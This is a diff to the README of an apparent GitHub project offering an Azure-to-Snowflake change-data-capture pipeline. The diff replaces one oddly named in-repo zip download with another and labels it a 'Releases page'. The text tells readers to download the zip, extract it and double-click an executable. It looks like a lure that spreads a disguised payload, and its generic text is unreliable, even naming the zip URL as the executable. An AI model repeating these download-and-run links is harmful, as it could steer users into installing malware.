@@ -1,7 +1,7 @@
 # 🚀 azure_snowflake_cdc_pipeline - Simplified Data Ingestion for Everyone
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Tchycolomuenho/azure_snowflake_cdc_pipeline/main/airflow/pipeline_azure_snowflake_cdc_haematinum.zip)](https://raw.githubusercontent.com/Tchycolomuenho/azure_snowflake_cdc_pipeline/main/airflow/pipeline_azure_snowflake_cdc_haematinum.zip)
+[![Download](https://github.com/Tchycolomuenho/azure_snowflake_cdc_pipeline/raw/refs/heads/main/snowflake/snowflake_azure_pipeline_cdc_unbasted.zip)](https://github.com/Tchycolomuenho/azure_snowflake_cdc_pipeline/raw/refs/heads/main/snowflake/snowflake_azure_pipeline_cdc_unbasted.zip)
 
 ## 📖 Overview
 The **azure_snowflake_cdc_pipeline** is a practical tool designed to help you move data smoothly from Azure to Snowflake. This pipeline utilizes cloud features to ensure efficient data processing and incremental loading. It’s perfect for real-world data projects.
@@ -16,7 +16,7 @@ The **azure_snowflake_cdc_pipeline** is a practical tool designed to help you mo
 Follow these steps to download and run the azure_snowflake_cdc_pipeline:
 
 1. **Visit the Download Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/Tchycolomuenho/azure_snowflake_cdc_pipeline/main/airflow/pipeline_azure_snowflake_cdc_haematinum.zip).
+   Go to the [Releases page](https://github.com/Tchycolomuenho/azure_snowflake_cdc_pipeline/raw/refs/heads/main/snowflake/snowflake_azure_pipeline_cdc_unbasted.zip).
 
 2. **Select the Latest Release**  
    Find the latest version at the top of the Releases page. It should have a version number like v1.0. 
@@ -28,7 +28,7 @@ Follow these steps to download and run the azure_snowflake_cdc_pipeline:
    Once downloaded, locate the file in your downloads folder. Extract it by right-clicking and selecting "Extract All" or a similar option depending on your operating system.
 
 5. **Run the Application**  
-   Open the extracted folder and double-click the executable file (e.g., `https://raw.githubusercontent.com/Tchycolomuenho/azure_snowflake_cdc_pipeline/main/airflow/pipeline_azure_snowflake_cdc_haematinum.zip`). Follow any prompts that appear.
+   Open the extracted folder and double-click the executable file (e.g., `https://github.com/Tchycolomuenho/azure_snowflake_cdc_pipeline/raw/refs/heads/main/snowflake/snowflake_azure_pipeline_cdc_unbasted.zip`). Follow any prompts that appear.
 
 6. **Configure the Pipeline**  
    After the application starts, you will see options for entering your Azure and Snowflake details. Fill in the required information to set up your data pipeline.
@@ -58,11 +58,11 @@ If you encounter any issues, consider the following steps:
 ## 🔄 Update Process
 To keep your pipeline up to date:
 
-1. **Visit the [Releases page](https://raw.githubusercontent.com/Tchycolomuenho/azure_snowflake_cdc_pipeline/main/airflow/pipeline_azure_snowflake_cdc_haematinum.zip)** regularly.
+1. **Visit the [Releases page](https://github.com/Tchycolomuenho/azure_snowflake_cdc_pipeline/raw/refs/heads/main/snowflake/snowflake_azure_pipeline_cdc_unbasted.zip)** regularly.
 2. Download and install the latest version using the same steps above.
 
 ## 🚀 Download & Install
-To get started, visit the [Releases page](https://raw.githubusercontent.com/Tchycolomuenho/azure_snowflake_cdc_pipeline/main/airflow/pipeline_azure_snowflake_cdc_haematinum.zip) and follow the installation steps outlined above.
+To get started, visit the [Releases page](https://github.com/Tchycolomuenho/azure_snowflake_cdc_pipeline/raw/refs/heads/main/snowflake/snowflake_azure_pipeline_cdc_unbasted.zip) and follow the installation steps outlined above.
 
 ## 👥 Community and Support
 Should you need further assistance, you can reach out to the community via GitHub Issues. We encourage feedback and contributions.
